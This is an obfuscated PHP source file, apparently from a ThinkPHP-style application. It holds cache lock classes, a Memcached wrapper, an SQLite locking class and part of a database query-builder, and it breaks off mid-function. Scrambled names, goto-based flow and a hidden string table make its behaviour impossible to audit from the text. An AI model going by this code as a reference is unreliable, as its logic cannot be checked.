<?php
 goto Aœ¦“ùµÄ; c‡“•²›µ±: class CacheLockMemcached { public function lock($C †ƒœ¨›ç, $eƒêï×‚ù¨ = 0) { $c¹¼¿‰óÖŸ = Cache::init(); $bÔö˜ÌÂ· = microtime(!0) + $eƒêï×‚ù¨; while (microtime(!0) < $bÔö˜ÌÂ·) { $cÓ¯ŸÛ¡ŸÒ = $c¹¼¿‰óÖŸ->get($C †ƒœ¨›ç); if (!$cÓ¯ŸÛ¡ŸÒ || $cÓ¯ŸÛ¡ŸÒ < microtime(!0)) { $Dàó®†íÄ = $c¹¼¿‰óÖŸ->handle->add($C †ƒœ¨›ç, $bÔö˜ÌÂ·, $eƒêï×‚ù¨); if ($Dàó®†íÄ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dø‚ÀŒó¯ô) { return Cache::init()->get($dø‚ÀŒó¯ô); } public function unlock($b¥Ü¾¨ïªå) { return Cache::init()->remove($b¥Ü¾¨ïªå); } } class CacheLockDatabase { public function lock($BâÍÀÕÛÑ, $E»˜—ôÕå« = 0) { $FÎ£®ê†Î… = Model($_SERVER[¯Ò¬Èè][771]); $f‹–Ã¢Ú³ = microtime(!0) + $E»˜—ôÕå«; while (microtime(!0) < $f‹–Ã¢Ú³) { $ašÅƒ†›Ä = $FÎ£®ê†Î…->get($BâÍÀÕÛÑ); if (!$ašÅƒ†›Ä || $ašÅƒ†›Ä < microtime(!0)) { $eÄ÷Ù²–› = $FÎ£®ê†Î…->set($BâÍÀÕÛÑ, $f‹–Ã¢Ú³); if ($eÄ÷Ù²–›) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c”Üƒ¿ğæ) { return Model($_SERVER[¯Ò¬Èè][771])->get($c”Üƒ¿ğæ); } public function unlock($AÃ…ô¯õÖ¦) { Model($_SERVER[¯Ò¬Èè][771])->remove($AÃ…ô¯õÖ¦); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($B»ƒáŸğÀ©, $BÁ³ºÕ£˜Í) { $AáÃÎ‹ôŠ¤ =& $_SERVER[¯Ò¬Èè]; if (!class_exists($AáÃÎ‹ôŠ¤[792])) { show_json($AáÃÎ‹ôŠ¤[793], !1); } $this->cacheTime = $BÁ³ºÕ£˜Í; $this->handle = new Memcached(); if (is_array($B»ƒáŸğÀ©[$AáÃÎ‹ôŠ¤[794]]) && count($B»ƒáŸğÀ©[$AáÃÎ‹ôŠ¤[794]]) >= 1) { foreach ($B»ƒáŸğÀ©[$AáÃÎ‹ôŠ¤[794]] as $C—ˆ°Ï‚Ä) { $F„Âí±ÆÖ = explode($AáÃÎ‹ôŠ¤[4], $C—ˆ°Ï‚Ä); $this->handle->addServer($F„Âí±ÆÖ[0], $F„Âí±ÆÖ[1]); } } else { $this->handle->addServer($B»ƒáŸğÀ©[$AáÃÎ‹ôŠ¤[169]], $B»ƒáŸğÀ©[$AáÃÎ‹ôŠ¤[170]]); } } public function set($c‰é©âæ±, $C¢§¤ŸÑÉË, $AÃÀô§×Ş = false) { $AÃÀô§×Ş = $AÃÀô§×Ş ? $AÃÀô§×Ş : $this->cacheTime; return $this->handle->set($c‰é©âæ±, $C¢§¤ŸÑÉË, $AÃÀô§×Ş); } public function get($e—á‚ï¿›) { return $this->handle->get($e—á‚ï¿›); } public function remove($EÃËùÁÎßÓ) { return $this->handle->delete($EÃËùÁÎßÓ); } public function deleteAll() { return $this->handle->flush(); } } goto fùÜ”§‚š; BñŠ•µœ÷: class DbSqlite3 extends DbSqlite3Base { public function query($a‰•„ÄºÓ) { goto CçÙ®…Ñø‰; EòÚ‰‰±ôè: fclose($FßÈæÅì©”); show_json($eİ‚±ÙÓ¤Ç[883], !1); return !1; goto c·‚½’†èô; aÉñ•›É­Ñ: if (!$FßÈæÅì©”) { return !1; } if (flock($FßÈæÅì©”, LOCK_EX)) { $BáòÒ¾á = parent::query($a‰•„ÄºÓ); flock($FßÈæÅì©”, LOCK_UN); fclose($FßÈæÅì©”); return $BáòÒ¾á; } flock($FßÈæÅì©”, LOCK_UN); goto EòÚ‰‰±ôè; CçÙ®…Ñø‰: $eİ‚±ÙÓ¤Ç =& $_SERVER[¯Ò¬Èè]; $CÃñ˜İÉ™Ï = DATA_PATH . $eİ‚±ÙÓ¤Ç[881]; $FßÈæÅì©” = fopen($CÃñ˜İÉ™Ï, $eİ‚±ÙÓ¤Ç[882]); goto aÉñ•›É­Ñ; c·‚½’†èô: } public function execute($bš§Ë×Õ«) { goto bªËÅ¶ÄÂõ; bªËÅ¶ÄÂõ: $DÁ‰çÈÚ†£ =& $_SERVER[¯Ò¬Èè]; $eãàÛ‹¬ìÏ = DATA_PATH . $DÁ‰çÈÚ†£[881]; $aÒÀ…¢‘™‰ = fopen($eãàÛ‹¬ìÏ, $DÁ‰çÈÚ†£[882]); goto eĞÕ½ë”†ô; fïéò½Èæİ: fclose($aÒÀ…¢‘™‰); show_json($DÁ‰çÈÚ†£[883], !1); return !1; goto c’‡³ŒÙ‘¡; eĞÕ½ë”†ô: if (!$aÒÀ…¢‘™‰) { return !1; } if (flock($aÒÀ…¢‘™‰, LOCK_EX)) { $c¿«è½‹Ò… = parent::execute($bš§Ë×Õ«); flock($aÒÀ…¢‘™‰, LOCK_UN); fclose($aÒÀ…¢‘™‰); return $c¿«è½‹Ò…; } flock($aÒÀ…¢‘™‰, LOCK_UN); goto fïéò½Èæİ; c’‡³ŒÙ‘¡: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\x3d", "\x6e\157\x74\x6c\151\153\145" => "\116\117\124\x20\x4c\x49\x4b\105", "\154\x69\153\x65" => "\114\111\113\x45", "\151\x6e" => "\x49\x4e", "\x6e\157\164\x69\x6e" => "\116\x4f\x54\x20\x49\116", "\x6e\x6f\164\x20\x69\156" => "\x4e\117\124\40\111\116", "\142\145\164\167\x65\145\156" => "\102\105\x54\x57\105\105\x4e", "\x6e\157\164\x62\145\164\167\x65\145\156" => "\x4e\117\124\40\102\x45\124\127\x45\x45\x4e", "\x6e\x6f\164\40\142\x65\164\x77\x65\x65\x6e" => "\x4e\117\x54\x20\102\x45\x54\x57\105\105\116"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\x25\x44\111\123\x54\111\x4e\x43\x54\x25\x20\45\106\111\x45\x4c\104\x25\40\106\x52\117\x4d\40\x25\124\101\102\x4c\105\45\45\112\117\111\116\45\45\127\x48\105\122\x45\45\x25\107\x52\x4f\x55\120\45\x25\110\x41\126\x49\x4e\x47\x25\45\117\122\x44\105\x52\45\x25\114\x49\x4d\111\x54\45\x20\x25\x55\x4e\x49\117\116\x25\45\x43\117\115\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $E¤—Ëé‹âÂ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¯Ò¬Èè][884], $E¤—Ëé‹âÂ); } public function factory($E«ƒê”Ó„ = '') { goto dò¹¦µË‘ø; e õÜ¢µ‡: $this->dbType = ucwords(strtolower($E«ƒê”Ó„[$FÅàÔìùá­[885]])); $fîïÛÀ™áê = $FÅàÔìùá­[887] . $this->dbType; if (class_exists($fîïÛÀ™áê)) { $dÓÅ¹Èæ¢ = new $fîïÛÀ™áê($E«ƒê”Ó„); if ($FÅàÔìùá­[738] != strtolower($E«ƒê”Ó„[$FÅàÔìùá­[885]])) { $dÓÅ¹Èæ¢->dbType = strtoupper($this->dbType); } else { $dÓÅ¹Èæ¢->dbType = $this->_getDsnType($E«ƒê”Ó„[$FÅàÔìùá­[837]]); } } else { think_exception(think_lang($FÅàÔìùá­[888]) . $FÅàÔìùá­[889] . $fîïÛÀ™áê); } goto Câ²£éœ…‚; Câ²£éœ…‚: return $dÓÅ¹Èæ¢; goto Fíº¯ÌÍ‡Á; dò¹¦µË‘ø: $FÅàÔìùá­ =& $_SERVER[¯Ò¬Èè]; $E«ƒê”Ó„ = $this->parseConfig($E«ƒê”Ó„); if (empty($E«ƒê”Ó„[$FÅàÔìùá­[885]])) { think_exception(think_lang($FÅàÔìùá­[886])); } goto e õÜ¢µ‡; Fíº¯ÌÍ‡Á: } public function __call($CŒè¾³¾¥Ê, $bæ‡‘ï°) { if (method_exists($this, $CŒè¾³¾¥Ê)) { return call_user_func_array(array($this, $CŒè¾³¾¥Ê), $bæ‡‘ï°); } } protected function _getDsnType($a‡Ì×Š­¯¤) { $AÛ°©ğ˜ñ = explode($_SERVER[¯Ò¬Èè][4], $a‡Ì×Š­¯¤); $eÂ¿Ô½Õ– = strtoupper(trim($AÛ°©ğ˜ñ[0])); return $eÂ¿Ô½Õ–; } private function parseConfig($b­®²‹æ = '') { $d¯ä¶íô° =& $_SERVER[¯Ò¬Èè]; if (!empty($b­®²‹æ) && is_string($b­®²‹æ)) { $b­®²‹æ = $this->parseDSN($b­®²‹æ); } elseif (is_array($b­®²‹æ)) { $b­®²‹æ = array_change_key_case($b­®²‹æ); $b­®²‹æ = array($d¯ä¶íô°[885] => $b­®²‹æ[$d¯ä¶íô°[737]], $d¯ä¶íô°[810] => $b­®²‹æ[$d¯ä¶íô°[890]], $d¯ä¶íô°[811] => $b­®²‹æ[$d¯ä¶íô°[891]], $d¯ä¶íô°[808] => $b­®²‹æ[$d¯ä¶íô°[892]], $d¯ä¶íô°[809] => $b­®²‹æ[$d¯ä¶íô°[893]], $d¯ä¶íô°[17] => $b­®²‹æ[$d¯ä¶íô°[894]], $d¯ä¶íô°[837] => $b­®²‹æ[$d¯ä¶íô°[739]], $d¯ä¶íô°[13] => isset($b­®²‹æ[$d¯ä¶íô°[895]]) ? $b­®²‹æ[$d¯ä¶íô°[895]] : array()); } elseif (empty($b­®²‹æ)) { if (think_config($d¯ä¶íô°[896]) && $d¯ä¶íô°[738] != strtolower(think_config($d¯ä¶íô°[897]))) { $b­®²‹æ = $this->parseDSN(think_config($d¯ä¶íô°[896])); } else { $b­®²‹æ = array($d¯ä¶íô°[885] => think_config($d¯ä¶íô°[897]), $d¯ä¶íô°[810] => think_config($d¯ä¶íô°[898]), $d¯ä¶íô°[811] => think_config($d¯ä¶íô°[899]), $d¯ä¶íô°[808] => think_config($d¯ä¶íô°[900]), $d¯ä¶íô°[809] => think_config($d¯ä¶íô°[901]), $d¯ä¶íô°[17] => think_config($d¯ä¶íô°[234]), $d¯ä¶íô°[837] => think_config($d¯ä¶íô°[896]), $d¯ä¶íô°[13] => think_config($d¯ä¶íô°[902])); } } return $b­®²‹æ; } protected function initConnect($A‡Ä£İæÀŠ = true) { if (1 == think_config($_SERVER[¯Ò¬Èè][18])) { $this->_linkID = $this->multiConnect($A‡Ä£İæÀŠ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($d„îÚ¶˜£³ = false) { $Eî‹¾ßº¡ =& $_SERVER[¯Ò¬Èè]; static $cİøÇ–îÏù = array(); if (empty($cİøÇ–îÏù)) { foreach ($this->config as $DÄæÀì…´„ => $fñöâÉ³) { $cİøÇ–îÏù[$DÄæÀì…´„] = explode($Eî‹¾ßº¡[47], $fñöâÉ³); } } if (think_config($Eî‹¾ßº¡[903])) { if ($d„îÚ¶˜£³) { $Aœ´Ü±‹š = floor(mt_rand(0, think_config($Eî‹¾ßº¡[904]) - 1)); } else { if (is_numeric(think_config($Eî‹¾ßº¡[905]))) { $Aœ´Ü±‹š = think_config($Eî‹¾ßº¡[905]); } else { $Aœ´Ü±‹š = floor(mt_rand(think_config($Eî‹¾ßº¡[904]), count($cİøÇ–îÏù[$Eî‹¾ßº¡[808]]) - 1)); } } } else { $Aœ´Ü±‹š = floor(mt_rand(0, count($cİøÇ–îÏù[$Eî‹¾ßº¡[808]]) - 1)); } $AÁæêÄ«ö¢ = array($Eî‹¾ßº¡[810] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[810]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[810]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[810]][0], $Eî‹¾ßº¡[811] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[811]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[811]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[811]][0], $Eî‹¾ßº¡[808] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[808]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[808]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[808]][0], $Eî‹¾ßº¡[809] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[809]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[809]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[809]][0], $Eî‹¾ßº¡[17] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[17]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[17]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[17]][0], $Eî‹¾ßº¡[837] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[837]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[837]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[837]][0], $Eî‹¾ßº¡[13] => isset($cİøÇ–îÏù[$Eî‹¾ßº¡[13]][$Aœ´Ü±‹š]) ? $cİøÇ–îÏù[$Eî‹¾ßº¡[13]][$Aœ´Ü±‹š] : $cİøÇ–îÏù[$Eî‹¾ßº¡[13]][0]); return $this->connect($AÁæêÄ«ö¢, $Aœ´Ü±‹š); } public function parseDSN($Eğ¯îß¨„) { $bå÷‹Ë¥²à =& $_SERVER[¯Ò¬Èè]; if (empty($Eğ¯îß¨„)) { return !1; } $Dˆ„òùêÜ = parse_url($Eğ¯îß¨„); if ($Dˆ„òùêÜ[$bå÷‹Ë¥²à[168]]) { $fÚºÆ°¦ïÍ = array($bå÷‹Ë¥²à[885] => $Dˆ„òùêÜ[$bå÷‹Ë¥²à[168]], $bå÷‹Ë¥²à[810] => isset($Dˆ„òùêÜ[$bå÷‹Ë¥²à[544]]) ? $Dˆ„òùêÜ[$bå÷‹Ë¥²à[544]] : $bå÷‹Ë¥²à[33], $bå÷‹Ë¥²à[811] => isset($Dˆ„òùêÜ[$bå÷‹Ë¥²à[906]]) ? $Dˆ„òùêÜ[$bå÷‹Ë¥²à[906]] : $bå÷‹Ë¥²à[33], $bå÷‹Ë¥²à[808] => isset($Dˆ„òùêÜ[$bå÷‹Ë¥²à[169]]) ? $Dˆ„òùêÜ[$bå÷‹Ë¥²à[169]] : $bå÷‹Ë¥²à[33], $bå÷‹Ë¥²à[809] => isset($Dˆ„òùêÜ[$bå÷‹Ë¥²à[170]]) ? $Dˆ„òùêÜ[$bå÷‹Ë¥²à[170]] : $bå÷‹Ë¥²à[33], $bå÷‹Ë¥²à[17] => isset($Dˆ„òùêÜ[$bå÷‹Ë¥²à[75]]) ? substr($Dˆ„òùêÜ[$bå÷‹Ë¥²à[75]], 1) : $bå÷‹Ë¥²à[33]); } else { preg_match($bå÷‹Ë¥²à[907], trim($Eğ¯îß¨„), $BÚ‚˜Š£); $fÚºÆ°¦ïÍ = array($bå÷‹Ë¥²à[885] => $BÚ‚˜Š£[1], $bå÷‹Ë¥²à[810] => $BÚ‚˜Š£[2], $bå÷‹Ë¥²à[811] => $BÚ‚˜Š£[3], $bå÷‹Ë¥²à[808] => $BÚ‚˜Š£[4], $bå÷‹Ë¥²à[809] => $BÚ‚˜Š£[5], $bå÷‹Ë¥²à[17] => $BÚ‚˜Š£[6]); } $fÚºÆ°¦ïÍ[$bå÷‹Ë¥²à[837]] = $bå÷‹Ë¥²à[33]; return $fÚºÆ°¦ïÍ; } protected function debug() { $B®©¾öƒÕá =& $_SERVER[¯Ò¬Èè]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $B®©¾öƒÕá[908]; if (think_config($B®©¾öƒÕá[909])) { think_status($B®©¾öƒÕá[910]); think_trace($this->queryStr . $B®©¾öƒÕá[911] . think_status($B®©¾öƒÕá[20], $B®©¾öƒÕá[910], 6) . $B®©¾öƒÕá[912], $B®©¾öƒÕá[33], $B®©¾öƒÕá[913]); } } protected function parseLock($fì¼ë—æ = false) { $bÊèŠÔòâÍ =& $_SERVER[¯Ò¬Èè]; if (!$fì¼ë—æ) { return $bÊèŠÔòâÍ[33]; } if ($bÊèŠÔòâÍ[839] == $this->dbType) { return $bÊèŠÔòâÍ[914]; } return $bÊèŠÔòâÍ[915]; } protected function parseSet($Cˆ—¤øñì) { $a…ÚÉ«Û² =& $_SERVER[¯Ò¬Èè]; foreach ($Cˆ—¤øñì as $A¼ÙÒ˜‡çÙ => $B„«‹­ñ‡Ş) { if (is_array($B„«‹­ñ‡Ş) && $a…ÚÉ«Û²[285] == $B„«‹­ñ‡Ş[0]) { $fÕ‚·Äå‡[] = $this->parseKey($A¼ÙÒ˜‡çÙ) . $a…ÚÉ«Û²[916] . $B„«‹­ñ‡Ş[1]; } elseif (is_scalar($B„«‹­ñ‡Ş) || is_null($B„«‹­ñ‡Ş)) { $fÕ‚·Äå‡[] = $this->parseKey($A¼ÙÒ˜‡çÙ) . $a…ÚÉ«Û²[916] . $this->parseValue($B„«‹­ñ‡Ş); } } return $a…ÚÉ«Û²[917] . implode($a…ÚÉ«Û²[47], $fÕ‚·Äå‡); } protected function bindParam($AÄïÓÃÈ‘‰, $Aá¯‘ŒÂäÙ) { $this->bind[$_SERVER[¯Ò¬Èè][4] . $AÄïÓÃÈ‘‰] = $Aá¯‘ŒÂäÙ; } protected function parseBind($Aë²áŒ†Ï“) { $Aë²áŒ†Ï“ = array_merge($this->bind, $Aë²áŒ†Ï“); $this->bind = array(); return $Aë²áŒ†Ï“; } function parseKey(&$eÎ„˜ÇÛ’×, $AÈ×åÌ»†Ã = true) { if ($AÈ×åÌ»†Ã) { $eÎ„˜ÇÛ’× = $this->parseKeyCheck($eÎ„˜ÇÛ’×); } return $eÎ„˜ÇÛ’×; } function parseKeyCheck($E‚ò†µƒÈ¥) { $bÔÚ¢ŠäæÁ =& $_SERVER[¯Ò¬Èè]; $E‚ò†µƒÈ¥ = trim($E‚ò†µƒÈ¥); if (!preg_match($bÔÚ¢ŠäæÁ[918], $E‚ò†µƒÈ¥)) { think_exception($bÔÚ¢ŠäæÁ[919] . $E‚ò†µƒÈ¥); } return $E‚ò†µƒÈ¥; } protected function parseValue($fÃÈ´ï§³’) { $aºòË¶¶¦à =& $_SERVER[¯Ò¬Èè]; if (is_string($fÃÈ´ï§³’)) { $fÃÈ´ï§³’ = $aºòË¶¶¦à[878] . $this->escapeString($fÃÈ´ï§³’) . $aºòË¶¶¦à[878]; } elseif (isset($fÃÈ´ï§³’[0]) && is_string($fÃÈ´ï§³’[0]) && strtolower($fÃÈ´ï§³’[0]) == $aºòË¶¶¦à[285]) { $fÃÈ´ï§³’ = $this->escapeString($fÃÈ´ï§³’[1]); } elseif (is_array($fÃÈ´ï§³’)) { $fÃÈ´ï§³’ = array_map(array($this, $aºòË¶¶¦à[879]), $fÃÈ´ï§³’); } elseif (is_bool($fÃÈ´ï§³’)) { $fÃÈ´ï§³’ = $fÃÈ´ï§³’ ? $aºòË¶¶¦à[83] : $aºòË¶¶¦à[468]; } elseif (is_null($fÃÈ´ï§³’)) { $fÃÈ´ï§³’ = $aºòË¶¶¦à[99]; } return $fÃÈ´ï§³’; } protected function parseField($Fµ‰¸ÇØ‚‹) { $Cˆ“Ú¾ºÇ =& $_SERVER[¯Ò¬Èè]; if (is_string($Fµ‰¸ÇØ‚‹) && strpos($Fµ‰¸ÇØ‚‹, $Cˆ“Ú¾ºÇ[47])) { $Fµ‰¸ÇØ‚‹ = explode($Cˆ“Ú¾ºÇ[47], $Fµ‰¸ÇØ‚‹); } if (is_array($Fµ‰¸ÇØ‚‹)) { $eÕ‡Êğ›« = array(); foreach ($Fµ‰¸ÇØ‚‹ as $BôòæÀâ«¼ => $cŸ¥ø¢ò») { if (!is_numeric($BôòæÀâ«¼)) { $eÕ‡Êğ›«[] = $this->parseKey($BôòæÀâ«¼) . $Cˆ“Ú¾ºÇ[920] . $this->parseKey($cŸ¥ø¢ò»); } else { $eÕ‡Êğ›«[] = $this->parseKey($cŸ¥ø¢ò»); } } $d¶ò®İ·ª¶ = implode($Cˆ“Ú¾ºÇ[47], $eÕ‡Êğ›«); } elseif (is_string($Fµ‰¸ÇØ‚‹) && !empty($Fµ‰¸ÇØ‚‹)) { $d¶ò®İ·ª¶ = $Fµ‰¸ÇØ‚‹; } else { $d¶ò®İ·ª¶ = $Cˆ“Ú¾ºÇ[176]; } return $d¶ò®İ·ª¶; } protected function parseTable($FÃê¯ä…âÀ) { $c‚×Şè›×º =& $_SERVER[¯Ò¬Èè]; if (is_array($FÃê¯ä…âÀ)) { $a¯¶éÓã = array(); foreach ($FÃê¯ä…âÀ as $E‰¢Ï³¯ù´ => $eÔÙĞÓ§ó«) { if (!is_numeric($E‰¢Ï³¯ù´)) { $a¯¶éÓã[] = $this->parseKey($E‰¢Ï³¯ù´) . $c‚×Şè›×º[50] . $this->parseKey($eÔÙĞÓ§ó«); } else { $a¯¶éÓã[] = $this->parseKey($E‰¢Ï³¯ù´); } } $FÃê¯ä…âÀ = $a¯¶éÓã; } elseif (is_string($FÃê¯ä…âÀ)) { if (strstr($FÃê¯ä…âÀ, $c‚×Şè›×º[50])) { return $FÃê¯ä…âÀ; } $FÃê¯ä…âÀ = explode($c‚×Şè›×º[47], $FÃê¯ä…âÀ); array_walk($FÃê¯ä…âÀ, array($this, $c‚×Şè›×º[827])); } return $c‚×Şè›×º[921] . trim(implode($c‚×Şè›×º[922], $FÃê¯ä…âÀ), $c‚×Şè›×º[833]) . $c‚×Şè›×º[921]; } protected function parseWhere($FòâÅ¯åØ) { $c¦‚ƒî¦ñ =& $_SERVER[¯Ò¬Èè]; $B×ô¨”èáÈ = $c¦‚ƒî¦ñ[33]; if (is_string($FòâÅ¯åØ)) { $B×ô¨”èáÈ = $FòâÅ¯åØ; } else { $EªàÖö…Ú = isset($FòâÅ¯åØ[$c¦‚ƒî¦ñ[923]]) ? strtoupper($FòâÅ¯åØ[$c¦‚ƒî¦ñ[923]]) : $c¦‚ƒî¦ñ[33]; if (in_array($EªàÖö…Ú, array($c¦‚ƒî¦ñ[924], $c¦‚ƒî¦ñ[925], $c¦‚ƒî¦ñ[926]))) { $EªàÖö…Ú = $c¦‚ƒî¦ñ[50] . $EªàÖö…Ú . $c¦‚ƒî¦ñ[50]; unset($FòâÅ¯åØ[$c¦‚ƒî¦ñ[923]]); } else { $EªàÖö…Ú = $c¦‚ƒî¦ñ[927]; } foreach ($FòâÅ¯åØ as $dß–‡‰‰‡ => $b©óÃ¤´öá) { $B×ô¨”èáÈ .= $c¦‚ƒî¦ñ[265]; if (is_numeric($dß–‡‰‰‡)) { $dß–‡‰‰‡ = $c¦‚ƒî¦ñ[928]; } if (0 === strpos($dß–‡‰‰‡, $c¦‚ƒî¦ñ[70])) { $B×ô¨”èáÈ .= $this->parseThinkWhere($dß–‡‰‰‡, $b©óÃ¤´öá); } else { if (!preg_match($c¦‚ƒî¦ñ[929], trim($dß–‡‰‰‡))) { think_exception(think_lang($c¦‚ƒî¦ñ[930]) . $c¦‚ƒî¦ñ[4] . $dß–‡‰‰‡); } $B„šÔå³÷ª = is_array($b©óÃ¤´öá) && isset($b©óÃ¤´öá[$c¦‚ƒî¦ñ[931]]); $dß–‡‰‰‡ = trim($dß–‡‰‰‡); if (strpos($dß–‡‰‰‡, $c¦‚ƒî¦ñ[271])) { $Eù¢…å…‘ = explode($c¦‚ƒî¦ñ[271], $dß–‡‰‰‡); $eæÒÇ•´²ñ = array(); foreach ($Eù¢…å…‘ as $c“êä—‹Ãš => $bÃÃÌİ®‘¸) { $b­ÉíŠä¶† = $B„šÔå³÷ª ? $b©óÃ¤´öá[$c“êä—‹Ãš] : $b©óÃ¤´öá; $eæÒÇ•´²ñ[] = $c¦‚ƒî¦ñ[248] . $this->parseWhereItem($this->parseKey($bÃÃÌİ®‘¸), $b­ÉíŠä¶†) . $c¦‚ƒî¦ñ[826]; } $B×ô¨”èáÈ .= implode($c¦‚ƒî¦ñ[932], $eæÒÇ•´²ñ); } elseif (strpos($dß–‡‰‰‡, $c¦‚ƒî¦ñ[272])) { $Eù¢…å…‘ = explode($c¦‚ƒî¦ñ[272], $dß–‡‰‰‡); $eæÒÇ•´²ñ = array(); foreach ($Eù¢…å…‘ as $c“êä—‹Ãš => $bÃÃÌİ®‘¸) { $b­ÉíŠä¶† = $B„šÔå³÷ª ? $b©óÃ¤´öá[$c“êä—‹Ãš] : $b©óÃ¤´öá; $eæÒÇ•´²ñ[] = $c¦‚ƒî¦ñ[248] . $this->parseWhereItem($this->parseKey($bÃÃÌİ®‘¸), $b­ÉíŠä¶†) . $c¦‚ƒî¦ñ[826]; } $B×ô¨”èáÈ .= implode($c¦‚ƒî¦ñ[927], $eæÒÇ•´²ñ); } else { $B×ô¨”èáÈ .= $this->parseWhereItem($this->parseKey($dß–‡‰‰‡), $b©óÃ¤´öá); } } $B×ô¨”èáÈ .= $c¦‚ƒî¦ñ[266] . $EªàÖö…Ú; } $B×ô¨”èáÈ = substr($B×ô¨”èáÈ, 0, -strlen($EªàÖö…Ú)); } return empty($B×ô¨”èáÈ) ? $c¦‚ƒî¦ñ[33] : $c¦‚ƒî¦ñ[933] . $B×ô¨”èáÈ; } protected function parseWhereItem($E§¨¹¦íßÓ, $DàŠ½¤ÕÜù) { $aô»ßºõÇæ =& $_SERVER[¯Ò¬Èè]; $BÙ‹óŒ™¦š = $aô»ßºõÇæ[33]; if (is_array($DàŠ½¤ÕÜù)) { if (is_string($DàŠ½¤ÕÜù[0])) { $d¬²¹‘¼…„ = strtolower($DàŠ½¤ÕÜù[0]); if (in_array($DàŠ½¤ÕÜù[0], array($aô»ßºõÇæ[916], $aô»ßºõÇæ[934], $aô»ßºõÇæ[935], $aô»ßºõÇæ[936], $aô»ßºõÇæ[937], $aô»ßºõÇæ[938]))) { $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $DàŠ½¤ÕÜù[0] . $aô»ßºõÇæ[50] . $this->parseValue($DàŠ½¤ÕÜù[1]); } elseif (preg_match($aô»ßºõÇæ[939], $DàŠ½¤ÕÜù[0])) { $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[50] . $this->parseValue($DàŠ½¤ÕÜù[1]); } elseif (preg_match($aô»ßºõÇæ[940], $DàŠ½¤ÕÜù[0])) { if (is_array($DàŠ½¤ÕÜù[1])) { $f…óÕ¸º‰« = isset($DàŠ½¤ÕÜù[2]) ? strtoupper($DàŠ½¤ÕÜù[2]) : $aô»ßºõÇæ[925]; if (in_array($f…óÕ¸º‰«, array($aô»ßºõÇæ[924], $aô»ßºõÇæ[925], $aô»ßºõÇæ[926]))) { $eù‹ŠŒ´‘ = array(); foreach ($DàŠ½¤ÕÜù[1] as $A­ÛÕ‡é“İ) { $eù‹ŠŒ´‘[] = $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[50] . $this->parseValue($A­ÛÕ‡é“İ); } $BÙ‹óŒ™¦š .= $aô»ßºõÇæ[248] . implode($aô»ßºõÇæ[50] . $f…óÕ¸º‰« . $aô»ßºõÇæ[50], $eù‹ŠŒ´‘) . $aô»ßºõÇæ[826]; } } else { $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[50] . $this->parseValue($DàŠ½¤ÕÜù[1]); } } elseif ($aô»ßºõÇæ[285] == $d¬²¹‘¼…„) { $BÙ‹óŒ™¦š .= $aô»ßºõÇæ[824] . $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $DàŠ½¤ÕÜù[1] . $aô»ßºõÇæ[941]; } elseif (preg_match($aô»ßºõÇæ[942], $DàŠ½¤ÕÜù[0])) { if (isset($DàŠ½¤ÕÜù[2]) && $aô»ßºõÇæ[285] == $DàŠ½¤ÕÜù[2]) { $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[50] . $DàŠ½¤ÕÜù[1]; } else { if (is_string($DàŠ½¤ÕÜù[1])) { $DàŠ½¤ÕÜù[1] = explode($aô»ßºõÇæ[47], $DàŠ½¤ÕÜù[1]); } $c¥õ¾×Îì = implode($aô»ßºõÇæ[47], $this->parseValue($DàŠ½¤ÕÜù[1])); $BÙ‹óŒ™¦š .= $E§¨¹¦íßÓ . $aô»ßºõÇæ[50] . $this->exp[$d¬²¹‘¼…„] . $aô»ßºõÇæ[824] . $c¥õ¾×Îì . $aô»ßºõÇæ[826]; } } elseif (preg_match($aô»ßºõÇæ[943], $DàŠ½¤ÕÜù[0])) { 